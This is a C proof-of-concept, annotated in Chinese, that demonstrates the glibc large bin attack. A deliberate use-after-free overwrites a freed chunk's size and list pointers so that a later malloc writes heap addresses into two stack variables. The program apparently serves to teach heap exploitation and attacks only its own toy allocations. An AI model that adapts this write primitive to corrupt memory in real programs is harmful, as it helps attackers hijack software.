#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

//这个小案例的主要思想是，通过UAF漏洞修改已经释放的large bin中的chunk中的fd,bk,fd_nextsize,bk_nextsize,size的值,使得下一次malloc一个内存块时，将unsorted bin中不分配的
//chunk 放到large bin 和 small bin中的时候，会进行比较以及修改原来large bin中chunk和准备插入进来的chunk的fd_nextsize、bk_nextsize、fd、bk。通过定制栈中chunk，使得想large
//bin 插入chunk的过程会改变栈中变量的值。方便方便以后利用。
int main()
{
    setbuf(stdout, NULL);

    
    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;
// 这里 p1,p2,p2分配的chunk的大小值都是大于0x3f0,最终会被放进large bin。但都超过了fast bin最大值的大小，会先被挂进unsorted bin中进行过度。
// 这里分配三个0x20大小的chunk，是用来方式合并的，这样向前，向后，或者和top chunk合并都不会发生
    unsigned long *p1 = malloc(0x420);
   
    malloc(0x20);

    unsigned long *p2 = malloc(0x500);
   
    malloc(0x20);

    unsigned long *p3 = malloc(0x500);
    
    malloc(0x20);
 
    free(p1);
    free(p2);
// unsortedbin
// all: 0x5555557576b0 —▸ 0x555555757250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555557576b0 
//           p2                  p1

    malloc(0x90);
//由于unsorted bin中是先进先出的这里会将p1对应的chunk进行部分分配，并将剩下内存块挂到unsorted bin中，并将p2挂挂进large bin中,fd_nextsize和bk_nextsize都指向chunk本身
//Free chunk (largebins) | PREV_INUSE
//Addr: 0x5555557576b0
//Size: 0x511
//fd: 0x7ffff7dce0d0
//bk: 0x7ffff7dce0d0
//fd_nextsize: 0x5555557576b0
//bk_nextsize: 0x5555557576b0

//将p3挂进unsorted bin中
    free(p3);
    printf("Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));

//由于之前的分配操作，p2所指的chunk已经被gua在llarge bin中，这里修改了，通过UAF漏洞修改了p2这个chunk的size,fd,bk,fd_nextsize,bk_nextsize。
//相当于构造了两个fake chunk, 且
    //------------VULNERABILITY-----------

    p2[-1] = 0x3f1; //此处将大小改成0x3f1, 为了在将p3挂进large bin中的时候，在比较size的大小的时候使得过程中进入P3_size > P2_size条件
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2); //chunk_p2->bk->fd=stack_var1
    p2[3] = (unsigned long)(&stack_var2 - 4); //chunk_p2->bk_nextsize->fd_nextsize=stack_var2

    //------------------------------------
//malloc时，进入此处代码
//else
//		{
//			P3->fd_nextsize = P2;  //P3的fd_nextsize要修改成P2的头指针
//			P3->bk_nextsize = P2->bk_nextsize; //P3的bk_nextsize要修改成P2的bk_nextsize指向的地址
//			P2->bk_nextsize = P3;  //P2的bk_nextsize要修改成P3的头指针
//			P3->bk_nextsize->fd_nextsize = P3; //P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针
//		}
//  bck = P2->bk; //bck等于P2的bk
//  这里最终得到的stack_var2的值等于p3的的chunk
//  最后,执行
//  mark_bin (av, victim_index);
//  victim->bk = bck; //bck相当于p2的bk指针
//  victim->fd = fwd; //victim是p3的头指针 chunk_p3
//  fwd->bk = victim;
//  bck->fd = victim;
//  最后得到stack_var2=p3的头指针
    malloc(0x90);

    // sanity check
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;
}
